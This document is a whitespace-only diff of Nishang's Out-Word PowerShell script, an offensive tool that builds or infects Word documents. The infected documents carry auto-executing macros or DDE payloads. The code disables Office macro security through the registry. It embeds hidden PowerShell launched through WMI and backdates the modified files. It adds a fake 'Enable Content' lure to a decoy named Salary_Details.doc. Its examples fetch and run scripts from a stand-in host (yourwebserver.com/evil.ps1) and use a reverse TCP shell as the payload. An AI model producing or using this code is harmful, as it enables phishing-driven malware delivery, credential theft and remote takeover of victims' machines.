@@ -2,14 +2,14 @@ function Out-Word
 {
 <#
 .SYNOPSIS
-Nishang Script which can generate as well as "infect" existing word files with an auto executable macro or DDE. 
+Nishang Script which can generate as well as "infect" existing word files with an auto executable macro or DDE.
 
 .DESCRIPTION
 The script can create as well as "infect" existing word files with an auto executable macro or DDE. Powershell or other payloads
 could be exeucted using the genereated files. If path to a folder is passed to the script it can insert the payload in all existing word
-files in the folder. With the Recurse switch, sub-folders can also be included. 
+files in the folder. With the Recurse switch, sub-folders can also be included.
 For existing files, a new macro or DDE enabled doc file is generated from a docx file and for existing .doc files, the payload is inserted.
-LastWriteTime of the docx file is set to the newly generated doc file. If the RemoveDocx switch is enabled, the 
+LastWriteTime of the docx file is set to the newly generated doc file. If the RemoveDocx switch is enabled, the
 original docx is removed and the data in it is lost.
 
 When a weapnoized Word file is generated, it contains a template to trick the target user in enabling content.
@@ -21,8 +21,8 @@ Payload which you want to execute on the target.
 URL of the powershell script which would be executed on the target.
 
 .PARAMETER PayloadScript
-Path to a PowerShell script on local machine. 
-Note that if the script expects any parameter passed to it, you must pass the parameters in the script itself. 
+Path to a PowerShell script on local machine.
+Note that if the script expects any parameter passed to it, you must pass the parameters in the script itself.
 
 .PARAMETER Arguments
 Arguments to the powershell script to be executed on the target. To be used with PayloadURL parameter.
@@ -52,17 +52,17 @@ Use above command to provide your own payload to be executed from macro. A file 
 in the current directory.
 
 .EXAMPLE
-PS > Out-Word -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 
+PS > Out-Word -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1
 
-Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
-you must pass the parameters in the script itself. A file named "Salary_Details.doc" would be generated in the 
+Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it,
+you must pass the parameters in the script itself. A file named "Salary_Details.doc" would be generated in the
 current directory with the script used as encoded payload.
 
 
 .EXAMPLE
 PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1
 
-Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
+Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file
 named "Salary_Details.doc" would be generated  in the current directory.
 
 .EXAMPLE
@@ -74,7 +74,7 @@ The Arugment parameter allows to pass arguments to the downloaded script.
 .EXAMPLE
 PS > Out-Word -PayloadURL http://yourwebserver.com/Powerpreter.psm1 -Arguments "Invoke-PsUACMe;Get-WLAN-Keys"
 
-Use above for multiple payloads. The idea is to use a script or module as payload which loads multiple functions. 
+Use above for multiple payloads. The idea is to use a script or module as payload which loads multiple functions.
 
 
 .EXAMPLE
@@ -112,7 +112,7 @@ Use above for custom payload with DDE.
 .EXAMPLE
 PS > Out-Word -PayloadScript C:\test\cradle.ps1 -DDE
 
-Use above to encode and use a script with DDE attack. Since only 255 characters are supported with 
+Use above to encode and use a script with DDE attack. Since only 255 characters are supported with
 the DDE attack, this is mostly useful only for using encoded cradles.
 
 
@@ -126,11 +126,11 @@ https://github.com/samratashok/nishang
 
 
     [CmdletBinding()] Param(
-        
+
         [Parameter(Position=0, Mandatory = $False)]
         [String]
         $Payload,
-        
+
         [Parameter(Position=1, Mandatory = $False)]
         [String]
         $PayloadURL,
@@ -146,11 +146,11 @@ https://github.com/samratashok/nishang
         [Parameter(Position=4, Mandatory = $False)]
         [Switch]
         $DDE,
-        
+
         [Parameter(Position=5, Mandatory = $False)]
         [String]
         $WordFileDir,
-        
+
         [Parameter(Position=6, Mandatory = $False)]
         [String]
         $OutputFile="$pwd\Salary_Details.doc",
@@ -158,7 +158,7 @@ https://github.com/samratashok/nishang
         [Parameter(Position=7, Mandatory = $False)]
         [Switch]
         $Recurse,
-        
+
         [Parameter(Position=8, Mandatory = $False)]
         [Switch]
         $RemoveDocx,
@@ -167,7 +167,7 @@ https://github.com/samratashok/nishang
         [Switch]
         $RemainUnSafe
     )
-    
+
     $Word = New-Object -ComObject Word.Application
     $WordVersion = $Word.Version
 
@@ -180,9 +180,9 @@ https://github.com/samratashok/nishang
     {
         $Word.DisplayAlerts = "wdAlertsNone"
     }
-    
+
     #Determine names for the Word versions. To be used for the template generated for tricking the targets.
-    
+
     switch ($WordVersion)
     {
         "11.0" {$WordName = "2003"}
@@ -192,8 +192,8 @@ https://github.com/samratashok/nishang
         "16.0" {$WordName = "2016"}
         default {$WordName = ""}
     }
-    
-        
+
+
     #Turn off Macro Security
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | Out-Null
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | Out-Null
@@ -212,7 +212,7 @@ https://github.com/samratashok/nishang
     {
         #Logic to read, compress and Base64 encode the payload script.
         $Enc = Get-Content $PayloadScript -Encoding Ascii
-    
+
         #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
         $ms = New-Object IO.MemoryStream
         $action = [IO.Compression.CompressionMode]::Compress
@@ -220,10 +220,10 @@ https://github.com/samratashok/nishang
         $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
         $Enc | ForEach-Object {$sw.WriteLine($_)}
         $sw.Close()
-    
+
         # Base64 encode stream
         $Compressed = [Convert]::ToBase64String($ms.ToArray())
-    
+
         $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
 
         "`$(New-Object IO.Compression.DeflateStream (" +
@@ -251,11 +251,11 @@ https://github.com/samratashok/nishang
             }
         }
         #Encoded script payload for Macro
-        $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
+        $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"
     }
 
     #Use line-continuation for longer payloads like encodedcommand or scripts.
-    #Though many Internet forums disagree, hit and trial shows 800 is the longest line length. 
+    #Though many Internet forums disagree, hit and trial shows 800 is the longest line length.
     #There cannot be more than 25 lines in line-continuation.
     $index = [math]::floor($Payload.Length/800)
     if ($index -gt 25)
@@ -265,14 +265,14 @@ https://github.com/samratashok/nishang
     }
     $i = 0
     $FinalPayload = ""
-    
+
     if ($Payload.Length -gt 800)
     {
         #Playing with the payload to fit in multiple lines in proper VBA syntax.
         while ($i -lt $index )
         {
-            $TempPayload = '"' + $Payload.Substring($i*800,800) + '"' + " _" + "`n" 
-            
+            $TempPayload = '"' + $Payload.Substring($i*800,800) + '"' + " _" + "`n"
+
             #First iteration doesn't need the & symbol.
             if ($i -eq 0)
             {
@@ -281,7 +281,7 @@ https://github.com/samratashok/nishang
             else
             {
                 $FinalPayload = $FinalPayload + "& " + $TempPayload
-            }            
+            }
             $i +=1
 
         }
@@ -289,7 +289,7 @@ https://github.com/samratashok/nishang
         $remainingindex = $Payload.Length%800
         if ($remainingindex -ne 0)
         {
-            $FinalPayload = $FinalPayload + "& " + '"' + $Payload.Substring($index*800, $remainingindex) + '"' 
+            $FinalPayload = $FinalPayload + "& " + '"' + $Payload.Substring($index*800, $remainingindex) + '"'
         }
 
     #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
@@ -304,7 +304,7 @@ https://github.com/samratashok/nishang
                 Const HIDDEN_WINDOW = 0
                 strComputer = "."
                 Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
+
                 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                 Set objConfig = objStartup.SpawnInstance_
                 objConfig.ShowWindow = HIDDEN_WINDOW
@@ -316,7 +316,7 @@ https://github.com/samratashok/nishang
     #If the payload is small in size, there is no need of multiline macro.
     else
     {
-        # Escape double quotes. Useful for rundll32 payloads where double quotes are used. 
+        # Escape double quotes. Useful for rundll32 payloads where double quotes are used.
         $FinalPayload = $Payload -replace '"','""'
         $code_one = @"
         Sub Document_Open()
@@ -329,7 +329,7 @@ https://github.com/samratashok/nishang
                 Const HIDDEN_WINDOW = 0
                 strComputer = "."
                 Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
+
                 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                 Set objConfig = objStartup.SpawnInstance_
                 objConfig.ShowWindow = HIDDEN_WINDOW
@@ -383,7 +383,7 @@ https://github.com/samratashok/nishang
                 $DocModule = $Doc.VBProject.VBComponents.Item(1)
                 $DocModule.CodeModule.AddFromString($code_one)
             }
-                        
+
             if ($WordFile.Extension -eq ".doc")
             {
                 $Savepath = $WordFile.FullName
@@ -401,7 +401,7 @@ https://github.com/samratashok/nishang
             else
             {
                 $Doc.Saveas([ref]$SavePath, 0)
-            } 
+            }
             Write-Output "Saved to file $SavePath"
             $Doc.Close()
             $LastModifyTime = $WordFile.LastWriteTime
@@ -437,10 +437,10 @@ https://github.com/samratashok/nishang
         {
             $DocModule = $Doc.VBProject.VBComponents.Item(1)
             $DocModule.CodeModule.AddFromString($code_one)
-        }        
+        }
         #Add stuff to trick user in Enabling Content (running macros)
-        $Selection = $Word.Selection 
-        $Selection.TypeParagraph() 
+        $Selection = $Word.Selection
+        $Selection.TypeParagraph()
         $Shape = $Doc.Shapes
 
         #Hardcoded path the jpg right now.
@@ -449,7 +449,7 @@ https://github.com/samratashok/nishang
         {
             [void] $Shape.AddPicture((Resolve-Path $MSLogoPath))
         }
-        $Selection.TypeParagraph() 
+        $Selection.TypeParagraph()
         $Selection.Font.Size = 42
         $Selection.TypeText("Microsoft Word $WordName")
         $Selection.TypeParagraph()
@@ -459,8 +459,8 @@ https://github.com/samratashok/nishang
         $Selection.TypeText("To load the document, please ")
         $Selection.Font.Bold = 1
         $Selection.TypeText("Enable Content")
-            
-    
+
+
         if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
         {
             $Doc.Saveas($OutputFile, 0)
@@ -468,7 +468,7 @@ https://github.com/samratashok/nishang
         else
         {
             $Doc.Saveas([ref]$OutputFile, [ref]0)
-        } 
+        }
         Write-Output "Saved to file $OutputFile"
         $Doc.Close()
         $Word.quit()
@@ -477,7 +477,7 @@ https://github.com/samratashok/nishang
 
     if ($RemainUnSafe)
     {
-        Write-Warning "RemainUnsafe selected. Not turning on Macro Security"   
+        Write-Warning "RemainUnsafe selected. Not turning on Macro Security"
     }
     else
     {
